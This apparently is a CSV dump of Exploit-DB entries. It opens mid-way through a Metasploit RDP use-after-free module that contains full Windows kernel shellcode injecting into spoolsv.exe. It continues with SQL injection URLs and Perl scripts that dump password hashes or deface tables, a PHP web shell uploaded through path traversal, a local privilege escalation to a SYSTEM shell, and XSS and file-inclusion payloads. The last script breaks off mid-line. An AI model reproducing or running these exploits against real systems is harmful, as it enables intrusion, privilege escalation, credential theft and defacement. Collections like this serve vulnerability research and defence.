rdp_create_channel_msg(self.rdp_user_id, target_channel_id + c, p, 0, 0xFFFFFFF)         end       end       rdp_send(tpkts)     end      # Terminating and disconnecting forces the USE     print_status(""Forcing the USE of FREE'd object ..."")     rdp_terminate     rdp_disconnect   end    # Helper function to create the kernel mode payload and the usermode payload with   # the egg hunter prefix.   def create_payloads(pool_address)     begin       [kernel_mode_payload, user_mode_payload].map { |p|         [           pool_address + HEADER_SIZE + 0x10, # indirect call gadget, over this pointer + egg           p         ].pack('<Qa*').ljust(CHUNK_SIZE - HEADER_SIZE, ""\x00"")       }     rescue => ex       print_error(""#{ex.backtrace.join(""\n"")}: #{ex.message} (#{ex.class})"")     end   end    def assemble_with_fixups(asm)     # Rewrite all instructions of form 'lea reg, [rel label]' as relative     # offsets for the instruction pointer, since metasm's 'ModRM' parser does     # not grok that syntax.     lea_rel = /lea+\s(?<dest>\w{2,3}),*\s\[rel+\s(?<label>[a-zA-Z_].*)\]/     asm.gsub!(lea_rel) do |match|       match = ""lea #{$1}, [rip + #{$2}]""     end      # metasm encodes all rep instructions as repnz     # https://github.com/jjyg/metasm/pull/40     asm.gsub!(/rep+\smovsb/, 'db 0xf3, 0xa4')      encoded = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encoded      # Fixup above rewritten instructions with the relative label offsets     encoded.reloc.each do |offset, reloc|       target = reloc.target.to_s       if encoded.export.key?(target)         # Note: this assumes the address we're fixing up is at the end of the         # instruction. This holds for 'lea' but if there are other fixups         # later, this might need to change to account for specific instruction         # encodings         if reloc.type == :i32           instr_offset = offset + 4         elsif reloc.type == :i16           instr_offset = offset + 2         end         encoded.fixup(target => encoded.export[target] - instr_offset)       else         raise ""Unknown symbol '#{target}' while resolving relative offsets""       end     end     encoded.fill     encoded.data   end    # The user mode payload has two parts. The first is an egg hunter that searches for   # the kernel mode payload. The second part is the actual payload that's invoked in   # user land (ie. it's injected into spoolsrv.exe). We need to spray both the kernel   # and user mode payloads around the heap in different packets because we don't have   # enough space to put them both in the same chunk. Given that code exec can result in   # landing on the user land payload, the egg is used to go to a kernel payload.   def user_mode_payload      asm = %Q^ _start:     lea rcx, [rel _start]     mov r8, 0x#{KERNELMODE_EGG.to_s(16)} _egg_loop:     sub rcx, 0x#{CHUNK_SIZE.to_s(16)}     sub rax, 0x#{CHUNK_SIZE.to_s(16)}     mov rdx, [rcx - 8]     cmp rdx, r8     jnz _egg_loop     jmp rcx     ^     egg_loop = assemble_with_fixups(asm)      # The USERMODE_EGG is required at the start as well, because the exploit code     # assumes the tag is there, and jumps over it to find the shellcode.     [       USERMODE_EGG,       egg_loop,       USERMODE_EGG,       payload.raw     ].pack('<Qa*<Qa*')   end    def kernel_mode_payload      # Windows x64 kernel shellcode from ring 0 to ring 3 by sleepya     #     # This shellcode was written originally for eternalblue exploits     # eternalblue_exploit7.py and eternalblue_exploit8.py     #     # Idea for Ring 0 to Ring 3 via APC from Sean Dillon (@zerosum0x0)     #     # Note:     # - The userland shellcode is run in a new thread of system process.     #     If userland shellcode causes any exception, the system process get killed.     # - On idle target with multiple core processors, the hijacked system call     #     might take a while (> 5 minutes) to get called because the system     #     call may be called on other processors.     # - The shellcode does not allocate shadow stack if possible for minimal shellcode size.     #     This is ok because some Windows functions do not require a shadow stack.     # - Compiling shellcode with specific Windows version macro, corrupted buffer will be freed.     #     Note: the Windows 8 version macros are removed below     # - The userland payload MUST be appened to this shellcode.     #     # References:     # - http://www.geoffchappell.com/studies/windows/km/index.htm (structures info)     # - https://github.com/reactos/reactos/blob/master/reactos/ntoskrnl/ke/apc.c      data_kapc_offset           = 0x10     data_nt_kernel_addr_offset = 0x8     data_origin_syscall_offset = 0     data_peb_addr_offset       = -0x10     data_queueing_kapc_offset  = -0x8     hal_heap_storage           = 0xffffffffffd04100      # These hashes are not the same as the ones used by the     # Block API so they have to be hard-coded.     createthread_hash              = 0x835e515e     keinitializeapc_hash           = 0x6d195cc4     keinsertqueueapc_hash          = 0xafcc4634     psgetcurrentprocess_hash       = 0xdbf47c78     psgetprocessid_hash            = 0x170114e1     psgetprocessimagefilename_hash = 0x77645f3f     psgetprocesspeb_hash           = 0xb818b848     psgetthreadteb_hash            = 0xcef84c3e     spoolsv_exe_hash               = 0x3ee083d8     zwallocatevirtualmemory_hash   = 0x576e99ea      asm = %Q^ shellcode_start:     nop     nop     nop     nop     ; IRQL is DISPATCH_LEVEL when got code execution      push rbp      call set_rbp_data_address_fn      ; read current syscall     mov ecx, 0xc0000082     rdmsr     ; do NOT replace saved original syscall address with hook syscall     lea r9, [rel syscall_hook]     cmp eax, r9d     je _setup_syscall_hook_done      ; if (saved_original_syscall != &KiSystemCall64) do_first_time_initialize     cmp dword [rbp+#{data_origin_syscall_offset}], eax     je _hook_syscall      ; save original syscall     mov dword [rbp+#{data_origin_syscall_offset}+4], edx     mov dword [rbp+#{data_origin_syscall_offset}], eax      ; first time on the target     mov byte [rbp+#{data_queueing_kapc_offset}], 0  _hook_syscall:     ; set a new syscall on running processor     ; setting MSR 0xc0000082 affects only running processor     xchg r9, rax     push rax     pop rdx     ; mov rdx, rax     shr rdx, 32     wrmsr  _setup_syscall_hook_done:     pop rbp  ;--------------------- HACK crappy thread cleanup -------------------- ; This code is effectively the same as the epilogue of the function that calls ; the vulnerable function in the kernel, with a tweak or two.      ; TODO: make the lock not suck!!     mov     rax, qword [gs:0x188]     add     word [rax+0x1C4], 1       ; KeGetCurrentThread()->KernelApcDisable++     lea     r11, [rsp+0b8h]     xor     eax, eax     mov     rbx, [r11+30h]     mov     rbp, [r11+40h]     mov     rsi, [r11+48h]     mov     rsp, r11     pop     r15     pop     r14     pop     r13     pop     r12     pop     rdi     ret  ;--------------------- END HACK crappy thread cleanup  ;======================================================================== ; Find memory address in HAL heap for using as data area ; Return: rbp = data address ;======================================================================== set_rbp_data_address_fn:     ; On idle target without user application, syscall on hijacked processor might not be called immediately.     ; Find some address to store the data, the data in this address MUST not be modified     ;   when exploit is rerun before syscall is called     ;lea rbp, [rel _set_rbp_data_address_fn_next + 0x1000]      ; ------ HACK rbp wasnt valid!      mov rbp, #{hal_heap_storage}    ; TODO: use some other buffer besides HAL heap??      ; --------- HACK end rbp  _set_rbp_data_address_fn_next:     ;shr rbp, 12     ;shl rbp, 12     ;sub rbp, 0x70   ; for KAPC struct too     ret      ;int 3     ;call $+5     ;pop r13 syscall_hook:     swapgs     mov qword [gs:0x10], rsp     mov rsp, qword [gs:0x1a8]     push 0x2b     push qword [gs:0x10]      push rax    ; want this stack space to store original syscall addr     ; save rax first to make this function continue to real syscall     push rax     push rbp    ; save rbp here because rbp is special register for accessing this shellcode data     call set_rbp_data_address_fn     mov rax, [rbp+#{data_origin_syscall_offset}]     add rax, 0x1f   ; adjust syscall entry, so we do not need to reverse start of syscall handler     mov [rsp+0x10], rax      ; save all volatile registers     push rcx     push rdx     push r8     push r9     push r10     push r11      ; use lock cmpxchg for queueing APC only one at a time     xor eax, eax     mov dl, 1     lock cmpxchg byte [rbp+#{data_queueing_kapc_offset}], dl     jnz _syscall_hook_done      ;======================================     ; restore syscall     ;======================================     ; an error after restoring syscall should never occur     mov ecx, 0xc0000082     mov eax, [rbp+#{data_origin_syscall_offset}]     mov edx, [rbp+#{data_origin_syscall_offset}+4]     wrmsr      ; allow interrupts while executing shellcode     sti     call r3_to_r0_start     cli  _syscall_hook_done:     pop r11     pop r10     pop r9     pop r8     pop rdx     pop rcx     pop rbp     pop rax     ret  r3_to_r0_start:     ; save used non-volatile registers     push r15     push r14     push rdi     push rsi     push rbx     push rax    ; align stack by 0x10      ;======================================     ; find nt kernel address     ;======================================     mov r15, qword [rbp+#{data_origin_syscall_offset}]      ; KiSystemCall64 is an address in nt kernel     shr r15, 0xc                ; strip to page size     shl r15, 0xc  _x64_find_nt_walk_page:     sub r15, 0x1000             ; walk along page size     cmp word [r15], 0x5a4d      ; 'MZ' header     jne _x64_find_nt_walk_page      ; save nt address for using in KernelApcRoutine     mov [rbp+#{data_nt_kernel_addr_offset}], r15      ;======================================     ; get current EPROCESS and ETHREAD     ;======================================     mov r14, qword [gs:0x188]    ; get _ETHREAD pointer from KPCR     mov edi, #{psgetcurrentprocess_hash}     call win_api_direct     xchg rcx, rax       ; rcx = EPROCESS      ; r15 : nt kernel address     ; r14 : ETHREAD     ; rcx : EPROCESS      ;======================================     ; find offset of EPROCESS.ImageFilename     ;======================================     mov edi, #{psgetprocessimagefilename_hash}     call get_proc_addr     mov eax, dword [rax+3]  ; get offset from code (offset of ImageFilename is always > 0x7f)     mov ebx, eax        ; ebx = offset of EPROCESS.ImageFilename       ;======================================     ; find offset of EPROCESS.ThreadListHead     ;======================================     ; possible diff from ImageFilename offset is 0x28 and 0x38 (Win8+)     ; if offset of ImageFilename is more than 0x400, current is (Win8+)      cmp eax, 0x400      ; eax is still an offset of EPROCESS.ImageFilename     jb _find_eprocess_threadlist_offset_win7     add eax, 0x10 _find_eprocess_threadlist_offset_win7:     lea rdx, [rax+0x28] ; edx = offset of EPROCESS.ThreadListHead      ;======================================     ; find offset of ETHREAD.ThreadListEntry     ;======================================      lea r8, [rcx+rdx]   ; r8 = address of EPROCESS.ThreadListHead     mov r9, r8      ; ETHREAD.ThreadListEntry must be between ETHREAD (r14) and ETHREAD+0x700 _find_ethread_threadlist_offset_loop:     mov r9, qword [r9]      cmp r8, r9          ; check end of list     je _insert_queue_apc_done    ; not found !!!      ; if (r9 - r14 < 0x700) found     mov rax, r9     sub rax, r14     cmp rax, 0x700     ja _find_ethread_threadlist_offset_loop     sub r14, r9         ; r14 = -(offset of ETHREAD.ThreadListEntry)       ;======================================     ; find offset of EPROCESS.ActiveProcessLinks     ;======================================     mov edi, #{psgetprocessid_hash}     call get_proc_addr     mov edi, dword [rax+3]  ; get offset from code (offset of UniqueProcessId is always > 0x7f)     add edi, 8      ; edi = offset of EPROCESS.ActiveProcessLinks = offset of EPROCESS.UniqueProcessId + sizeof(EPROCESS.UniqueProcessId)       ;======================================     ; find target process by iterating over EPROCESS.ActiveProcessLinks WITHOUT lock     ;======================================     ; check process name       xor eax, eax      ; HACK to exit earlier if process not found  _find_target_process_loop:     lea rsi, [rcx+rbx]      push rax     call calc_hash     cmp eax, #{spoolsv_exe_hash}  ; ""spoolsv.exe""     pop rax     jz found_target_process  ;---------- HACK PROCESS NOT FOUND start -----------     inc rax     cmp rax, 0x300      ; HACK not found!     jne _next_find_target_process     xor ecx, ecx     ; clear queueing kapc flag, allow other hijacked system call to run shellcode     mov byte [rbp+#{data_queueing_kapc_offset}], cl      jmp _r3_to_r0_done  ;---------- HACK PROCESS NOT FOUND end -----------  _next_find_target_process:     ; next process     mov rcx, [rcx+rdi]     sub rcx, rdi     jmp _find_target_process_loop   found_target_process:     ; The allocation for userland payload will be in KernelApcRoutine.     ; KernelApcRoutine is run in a target process context. So no need to use KeStackAttachProcess()      ;======================================     ; save process PEB for finding CreateThread address in kernel KAPC routine     ;======================================     mov edi, #{psgetprocesspeb_hash}     ; rcx is EPROCESS. no need to set it.     call win_api_direct     mov [rbp+#{data_peb_addr_offset}], rax       ;======================================     ; iterate ThreadList until KeInsertQueueApc() success     ;======================================     ; r15 = nt     ; r14 = -(offset of ETHREAD.ThreadListEntry)     ; rcx = EPROCESS     ; edx = offset of EPROCESS.ThreadListHead       lea rsi, [rcx + rdx]    ; rsi = ThreadListHead address     mov rbx, rsi    ; use rbx for iterating thread      ; checking alertable from ETHREAD structure is not reliable because each Windows version has different offset.     ; Moreover, alertable thread need to be waiting state which is more difficult to check.     ; try queueing APC then check KAPC member is more reliable.  _insert_queue_apc_loop:     ; move backward because non-alertable and NULL TEB.ActivationContextStackPointer threads always be at front     mov rbx, [rbx+8]      cmp rsi, rbx     je _insert_queue_apc_loop   ; skip list head      ; find start of ETHREAD address     ; set it to rdx to be used for KeInitializeApc() argument too     lea rdx, [rbx + r14]    ; ETHREAD      ; userland shellcode (at least CreateThread() function) need non NULL TEB.ActivationContextStackPointer.     ; the injected process will be crashed because of access violation if TEB.ActivationContextStackPointer is NULL.     ; Note: APC routine does not require non-NULL TEB.ActivationContextStackPointer.     ; from my observation, KTRHEAD.Queue is always NULL when TEB.ActivationContextStackPointer is NULL.     ; Teb member is next to Queue member.     mov edi, #{psgetthreadteb_hash}     call get_proc_addr     mov eax, dword [rax+3]      ; get offset from code (offset of Teb is always > 0x7f)     cmp qword [rdx+rax-8], 0    ; KTHREAD.Queue MUST not be NULL     je _insert_queue_apc_loop      ; KeInitializeApc(PKAPC,     ;                 PKTHREAD,     ;                 KAPC_ENVIRONMENT = OriginalApcEnvironment (0),     ;                 PKKERNEL_ROUTINE = kernel_apc_routine,     ;                 PKRUNDOWN_ROUTINE = NULL,     ;                 PKNORMAL_ROUTINE = userland_shellcode,     ;                 KPROCESSOR_MODE = UserMode (1),     ;                 PVOID Context);     lea rcx, [rbp+#{data_kapc_offset}]     ; PAKC     xor r8, r8      ; OriginalApcEnvironment     lea r9, [rel kernel_kapc_routine]    ; KernelApcRoutine     push rbp    ; context     push 1      ; UserMode     push rbp    ; userland shellcode (MUST NOT be NULL)     push r8     ; NULL     sub rsp, 0x20   ; shadow stack     mov edi, #{keinitializeapc_hash}     call win_api_direct     ; Note: KeInsertQueueApc() requires shadow stack. Adjust stack back later      ; BOOLEAN KeInsertQueueApc(PKAPC, SystemArgument1, SystemArgument2, 0);     ;   SystemArgument1 is second argument in usermode code (rdx)     ;   SystemArgument2 is third argument in usermode code (r8)     lea rcx, [rbp+#{data_kapc_offset}]     ;xor edx, edx   ; no need to set it here     ;xor r8, r8     ; no need to set it here     xor r9, r9     mov edi, #{keinsertqueueapc_hash}     call win_api_direct     add rsp, 0x40     ; if insertion failed, try next thread     test eax, eax     jz _insert_queue_apc_loop      mov rax, [rbp+#{data_kapc_offset}+0x10]     ; get KAPC.ApcListEntry     ; EPROCESS pointer 8 bytes     ; InProgressFlags 1 byte     ; KernelApcPending 1 byte     ; if success, UserApcPending MUST be 1     cmp byte [rax+0x1a], 1     je _insert_queue_apc_done      ; manual remove list without lock     mov [rax], rax     mov [rax+8], rax     jmp _insert_queue_apc_loop  _insert_queue_apc_done:     ; The PEB address is needed in kernel_apc_routine. Setting QUEUEING_KAPC to 0 should be in kernel_apc_routine.  _r3_to_r0_done:     pop rax     pop rbx     pop rsi     pop rdi     pop r14     pop r15     ret  ;======================================================================== ; Call function in specific module ; ; All function arguments are passed as calling normal function with extra register arguments ; Extra Arguments: r15 = module pointer ;                  edi = hash of target function name ;======================================================================== win_api_direct:     call get_proc_addr     jmp rax   ;======================================================================== ; Get function address in specific module ; ; Arguments: r15 = module pointer ;            edi = hash of target function name ; Return: eax = offset ;======================================================================== get_proc_addr:     ; Save registers     push rbx     push rcx     push rsi                ; for using calc_hash      ; use rax to find EAT     mov eax, dword [r15+60]  ; Get PE header e_lfanew     mov eax, dword [r15+rax+136] ; Get export tables RVA      add rax, r15     push rax                 ; save EAT      mov ecx, dword [rax+24]  ; NumberOfFunctions     mov ebx, dword [rax+32]  ; FunctionNames     add rbx, r15  _get_proc_addr_get_next_func:     ; When we reach the start of the EAT (we search backwards), we hang or crash     dec ecx                     ; decrement NumberOfFunctions     mov esi, dword [rbx+rcx*4]  ; Get rva of next module name     add rsi, r15                ; Add the modules base address      call calc_hash      cmp eax, edi                        ; Compare the hashes     jnz _get_proc_addr_get_next_func    ; try the next function  _get_proc_addr_finish:     pop rax                     ; restore EAT     mov ebx, dword [rax+36]     add rbx, r15                ; ordinate table virtual address     mov cx, word [rbx+rcx*2]    ; desired functions ordinal     mov ebx, dword [rax+28]     ; Get the function addresses table rva     add rbx, r15                ; Add the modules base address     mov eax, dword [rbx+rcx*4]  ; Get the desired functions RVA     add rax, r15                ; Add the modules base address to get the functions actual VA      pop rsi     pop rcx     pop rbx     ret  ;======================================================================== ; Calculate ASCII string hash. Useful for comparing ASCII string in shellcode. ; ; Argument: rsi = string to hash ; Clobber: rsi ; Return: eax = hash ;======================================================================== calc_hash:     push rdx     xor eax, eax     cdq _calc_hash_loop:     lodsb                   ; Read in the next byte of the ASCII string     ror edx, 13             ; Rotate right our hash value     add edx, eax            ; Add the next byte of the string     test eax, eax           ; Stop when found NULL     jne _calc_hash_loop     xchg edx, eax     pop rdx     ret   ; KernelApcRoutine is called when IRQL is APC_LEVEL in (queued) Process context. ; But the IRQL is simply raised from PASSIVE_LEVEL in KiCheckForKernelApcDelivery(). ; Moreover, there is no lock when calling KernelApcRoutine. ; So KernelApcRoutine can simply lower the IRQL by setting cr8 register. ; ; VOID KernelApcRoutine( ;           IN PKAPC Apc, ;           IN PKNORMAL_ROUTINE *NormalRoutine, ;           IN PVOID *NormalContext, ;           IN PVOID *SystemArgument1, ;           IN PVOI",,
,,0,
2986,"Enthrallweb ePhotos 1.0 - 'subLevel2.asp' SQL Injection ******************************************************************************* # Title   :  Enthrallweb ePhotos 1.0 (subLevel2.asp) Remote SQL Injection Vulnerability # Author  :  ajann # Contact :  :( # S.Page  :  http://www.enthrallweb.us # $$      :  179.40 USD  *******************************************************************************  [[SQL]]]---------------------------------------------------------  http://[target]/[path]//subLevel2.asp?Cat_ID=33&SUB_ID=[SQL]  Example:  //subLevel2.asp?Cat_ID=33&SUB_ID=-1%20union%20select%20U_ID,U_PASSWORD,0,0,0,U_email,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20users  [[/SQL]]  """""""""""""""""""""""""""""""""""""""""" # ajann,Turkey # ...  # Im not Hacker!  # milw0rm.com [2006-12-23]","[""'subLevel2.asp'""]",1
41649,"Microsoft Windows - Uniscribe Font Processing Heap Memory Corruption in 'USP10!otlCacheManager::GlyphsSubstituted' (MS17-011) Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1025  We have encountered a crash in the Windows Uniscribe user-mode library, in the memset() function called by USP10!otlCacheManager::GlyphsSubstituted, while trying to display text using a corrupted font file:  --- (449c.6338): Access violation - code c0000005 (first chance) First chance exceptions are reported before any exception handling. This exception may be expected and handled. eax=092ac250 ebx=092ac230 ecx=00000784 edx=00000074 esi=0028ea6c edi=092affd0 eip=76bc9c8d esp=0028e978 ebp=0028e97c iopl=0         nv up ei pl nz na pe nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010206 msvcrt!_VEC_memcpy+0x116: 76bc9c8d 660f7f4730      movdqa  xmmword ptr [edi+30h],xmm0 ds:002b:092b0000=???????????????????????????????? 0:000> kb ChildEBP RetAddr  Args to Child               0028e97c 76bc9c39 092ac250 0003ff80 00000006 msvcrt!_VEC_memcpy+0x116 0028e99c 76bc9cde 092ac250 00000000 0003fff4 msvcrt!_VEC_memzero+0x36 0028e9c0 75234b58 092ac248 00000000 0003fffc msvcrt!_VEC_memzero+0x82 0028e9e0 752336a1 0028ed18 00000006 0000ffff USP10!otlCacheManager::GlyphsSubstituted+0xc8 0028ebc0 7522f29f 42555347 0028ed58 0028ece4 USP10!ApplyFeatures+0x541 0028ec0c 7522b083 00000000 092c6ffc 092c6e18 USP10!SubstituteOtlGlyphs+0x1bf 0028ec38 75223921 0028ecb4 0028ed0c 0028ed58 USP10!ShapingLibraryInternal::SubstituteOtlGlyphsWithLanguageFallback+0x23 0028eed0 7521548a 0028efdc 0028f008 0028eff0 USP10!ArabicEngineGetGlyphs+0x891 0028ef90 7521253f 0028efdc 0028f008 0028eff0 USP10!ShapingGetGlyphs+0x36a 0028f078 751e5c6f 2a0123f2 092a6124 092a6318 USP10!ShlShape+0x2ef 0028f0bc 751f167a 2a0123f2 092a6124 092a6318 USP10!ScriptShape+0x15f 0028f11c 751f2b14 00000000 00000000 0028f19c USP10!RenderItemNoFallback+0xfa 0028f148 751f2da2 00000000 00000000 0028f19c USP10!RenderItemWithFallback+0x104 0028f16c 751f4339 00000000 0028f19c 092a6124 USP10!RenderItem+0x22 0028f1b0 751e7a04 000004a0 00000400 2a0123f2 USP10!ScriptStringAnalyzeGlyphs+0x1e9 0028f1c8 76ca5465 2a0123f2 092a6040 0000000a USP10!ScriptStringAnalyse+0x284 0028f214 76ca5172 2a0123f2 0028f5fc 0000000a LPK!LpkStringAnalyse+0xe5 0028f310 76ca1410 2a0123f2 00000000 00000000 LPK!LpkCharsetDraw+0x332 0028f344 763c18b0 2a0123f2 00000000 00000000 LPK!LpkDrawTextEx+0x40 0028f384 763c22bf 2a0123f2 00000070 00000000 USER32!DT_DrawStr+0x13c 0028f3d0 763c21f2 2a0123f2 0028f5fc 0028f610 USER32!DT_GetLineBreak+0x78 0028f47c 763c14d4 2a0123f2 00000000 0000000a USER32!DrawTextExWorker+0x255 0028f4a0 763c2475 2a0123f2 0028f5fc ffffffff USER32!DrawTextExW+0x1e 0028f4d4 01336a5c 2a0123f2 0028f5fc ffffffff USER32!DrawTextW+0x4d [...] 0:000> dd edi 092affd0  00000000 00000000 00000000 00000000 092affe0  00000000 00000000 00000000 00000000 092afff0  00000000 00000000 00000000 00000000 092b0000  ???????? ???????? ???????? ???????? 092b0010  ???????? ???????? ???????? ???????? 092b0020  ???????? ???????? ???????? ???????? 092b0030  ???????? ???????? ???????? ???????? 092b0040  ???????? ???????? ???????? ???????? ---  The issue reproduces on Windows 7. It is easiest to reproduce with PageHeap enabled, but it is also possible to observe a crash in a default system configuration. In order to reproduce the problem with the provided samples, it might be necessary to use a custom program which displays all of the font's glyphs at various point sizes.  Attached is an archive with 2 crashing samples.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41649.zip","[""'USP10!otlCacheManager::GlyphsSubstituted'""]",1
47845,"Plantronics Hub 3.13.2 - Local Privilege Escalation # Exploit Title: Plantronics Hub 3.13.2 - Local Privilege Escalation # Date: 2020-01-2 # Exploit Author: Markus Krell - @MarkusKrell # Vendor Homepage: https://support.polycom.com/content/dam/polycom-support/global/documentation/plantronics-hub-local-privilege-escalation-vulnerability.pdf # Software Link: https://www.plantronics.com/content/dam/plantronics/software/PlantronicsHubInstaller-3.13.2.exe # Version: Plantronics Hub for Windows prior to version 3.14 # Tested on: Windows 10 Enterprise # CVE : N/A  As a regular user drop a file called ""MajorUpgrade.config"" inside the ""C:\ProgramData\Plantronics\Spokes3G"" directory. The content of MajorUpgrade.config should look like the following one liner: <WINDOWS-USERNAME>|advertise|<FULL-PATH-TO-YOUR-DESIRED-PAYLOAD>  Exchange <WINDOWS-USERNAME> with your local (non-administrative) username. Calling cmd.exe is the most basic exploitation, as it will spawn a system shell in your (unprivileged) windows session.  You may of course call any other binary you can plant on the machine.  Steps for exploitation (PoC): - Open cmd.exe  - Navigate using cd C:\ProgramData\Plantronics\Spokes3G - echo %username%^|advertise^|C:\Windows\System32\cmd.exe > MajorUpgrade.config",['MajorUpgrade.config'],1
26944,Commercial Interactive Media SCOOP! 2.3 - 'articleZone.asp?Invalid' Cross-Site Scripting source: https://www.securityfocus.com/bid/16015/info      Commercial Interactive Media SCOOP! is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.      An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.      Version 2.3 of Commercial Interactive Media SCOOP! is reportedly vulnerable to these issues; other versions may also be affected.   http://www.example.com/articleZone.asp?example2=[XSS],"[""'articleZone.asp?Invalid'""]",1
32573,Microsoft Windows Vista/2003 - 'UnhookWindowsHookEx' Local Denial of Service source: https://www.securityfocus.com/bid/32206/info  Microsoft Windows is prone to a local denial-of-service vulnerability.  Attackers may exploit this issue to deny further service to legitimate users.  This issue affects Windows 2003 and Windows Vista; other versions may also be affected.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32573.zip,"[""'UnhookWindowsHookEx'""]",1
30199,WebIf - 'OutConfig' Local File Inclusion source: https://www.securityfocus.com/bid/24516/info  WebIf is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  Exploiting this issue may allow an unauthorized user to view files and execute local scripts.   http://www.example.com/webif/webif.cgi?cmd=query&config=conf_2000/config.txt&outconfig=../../../../etc/issue,"[""'OutConfig'""]",1
4910,"RichStrong CMS - 'cat' SQL Injection --==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==-- --==+         RichStrong CMS  (showproduct.asp?cat=) Remote SQL Injection Exploit        +==-- --==+====================================================================================+==--                      [+] [JosS] + [Spanish Hackers Team] + [Sys - Project]  [+] Info:  [~] Software: RichStrong CMS [~] HomePage: http://www.hzrich.cn [~] Exploit: Remote Sql Injection [High] [~] Where: showproduct.asp?cat= [~] Bug Found By: JosS [~] Contact: sys-project[at]hotmail.com [~] Web: http://www.spanish-hackers.com [~] Dork: ""Power by:RichStrong CMS"" [~] Dork2: Priv8, xD!  [+] Tables:  [*] Table 1: subject  [+] Columns:  [*] Column 1: id [*] Column 2: subjectname [*] Column 3: subjecttype [*] Column 4: displayorder [*] Column 5: description [*] Column 6: layout [*] Column 7: style [*] Column 8: category [*] Column 9: workflowID_R [*] Column 10: workflowID_S [*] Column 11: status [*] Column 12: owner [*] Column 13: isinherit [*] Column 14: doclistcount [*] Column 15: docstyle [*] Column 16: docsecrettype [*] Column 17: docpubdays [*] Column 18: wwwname [*] Column 19: logo [*] Column 20: contactus  [+] Exploit:   #!/usr/bin/perl  # RichStrong CMS - Remote SQL Injection Exploit # Code by JosS # Contact: sys-project[at]hotmail.com # Spanish Hackers Team # www.spanish-hackers.com  use IO::Socket::INET; use LWP::UserAgent; use HTTP::Request; use LWP::Simple;  sub lw {  my $SO = $^O; my $linux = """"; if (index(lc($SO),""win"")!=-1){ 		   $linux=""0""; 	    }else{ 		    $linux=""1""; 	    } 		if($linux){ system(""clear""); } else{ system(""cls""); system (""title RichStrong CMS - Remote SQL Injection Exploit - By JosS""); system (""color 02""); }  }  #*************************** expl ******************************   &lw;  print ""\t\t########################################################\n\n""; print ""\t\t#    RichStrong CMS - Remote SQL Injection Exploit     #\n\n""; print ""\t\t#                        by JosS                       #\n\n""; print ""\t\t########################################################\n\n"";  print ""Url Victim (Ex: www.localhost/showproduct.asp?cat=):  ""; $host=<STDIN>; chomp $host; print ""\n"";    if ( $host   !~   /^http:/ ) {      # lo aÃ±adimos     $host = 'http://' . $host; }   print ""Message: ""; $message=<STDIN>; chomp $message; print ""\n"";  @columnas=(""id"",""subjectname"",""subjecttype"",""displayorder"",""description"",""layout"",""style"",""category"",""workflowID_R"",""workflowID_S"",""status"",""owner"", ""isinherit"",""doclistcount"",""docstyle"",""docsecrettype"",""docpubdays"",""wwwname"",""logo"",""contactus"");   for ($i=0;$i<=21;$i++)  {  $comando=""'%20update%20subject%20set%20$columnas[$i]='<h1>$message'--""; $comando =~ s/ /+/g;  my $final = $host.$comando; my $ua = LWP::UserAgent->new; my $req = HTTP::Request->new(GET => $final); $doc = $ua->request($req)->as_string;  print ""update: $columnas[$i]\n"";  }    --==+=================== Spanish Hackers Team (www.spanish-hackers.com) =================+==-- --==+                                       JosS                                         +==-- --==+====================================================================================+==--                                        [+] [The End]  # milw0rm.com [2008-01-14]","[""'cat'""]",0
25065,"Magic Winmail Server 4.0 (Build 1112) - 'upload.php' Traversal Arbitrary File Upload source: https://www.securityfocus.com/bid/12388/info   Magic Winmail Server is reportedly affected by multiple vulnerabilities.   There are two distinct directory traversal vulnerabilities in the Webmail interface allowing both arbitrary file downloads and uploads. There is also a HTML injection vulnerability in the Webmail interface that could lead to the theft of the administrator's session cookie.   There are several directory traversal vulnerabilities in the IMAP service commands which could permit a malicious user to read arbitrary emails, create or delete arbitrary files on the server and possibly retrieve arbitrary files from the server.   Magic Winmail Server's FTP service also reportedly fails to properly verify the IP address supplied by a user in a PORT command.   Magic Winmail Server version 4.0 (Build 1112) is reportedly affected by these issues; earlier versions may also be vulnerable.   -----------------------------31140333525651 Content-Disposition: form-data; name=""userfile1""; filename=""/../../../a.php"" Content-Type: application/download  <?php system($_GET[cmd]); ?>","[""'upload.php'""]",1
28910,"PHPKit 1.6.1 - 'popup.php' SQL Injection source: https://www.securityfocus.com/bid/20911/info  PHPKIT is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in an SQL query.   A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database implementation.  PHPKIT 1.6 RC2 and prior versions are vulnerable to this issue.  #!/usr/bin/perl  use IO::Socket;  print q{ ----------------------------------------------- PHPKit 1.6.1 exploit by x23 ~ phcn.ws ~ geek-network.de use: phpkit161.pl [server] [dir] [vic_id] sample: $ perl phpkit161.pl localhost /phpkit/ 1 -----------------------------------------------  };  $webpage =   $ARGV[0]; $directory = $ARGV[1]; $vic_id =    $ARGV[2];  if (!$vic_id) { die ""~ read how to use ;)\n""; }  print ""~ connecting\n""; $sock = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$webpage"", PeerPort=>""80"") || die ""[+] Can't connect to Server\n"";  print ""~ exploiting\n""; print $sock ""POST "".$directory.""popup.php?path=misc/finduser.php HTTP/1.1\r\n""; print $sock ""Host: $webpage\r\n""; print $sock ""Keep-Alive: 300\r\n""; print $sock ""Content-Type: application/x-www-form-urlencoded\r\n""; print $sock ""Content-Length: "".length(""search_user=%27+AND+1%3D0+UNION+SELECT+user_pw+FROM+phpkit_user+WHERE+user_id%3D"".$vic_id.""%2F*&action=Suche&User=-1"").""\r\n\r\n"";  print $sock ""search_user=%27+AND+1%3D0+UNION+SELECT+user_pw+FROM+phpkit_user+WHERE+user_id%3D"".$vic_id.""%2F*&action=Suche&User=-1"";  while ($answer = <$sock>) {   #print $answer;   if ($answer =~/<option value=""([0-9a-f]{32})"">/) {      print ""~ hash: $1\n"";      close($sock);      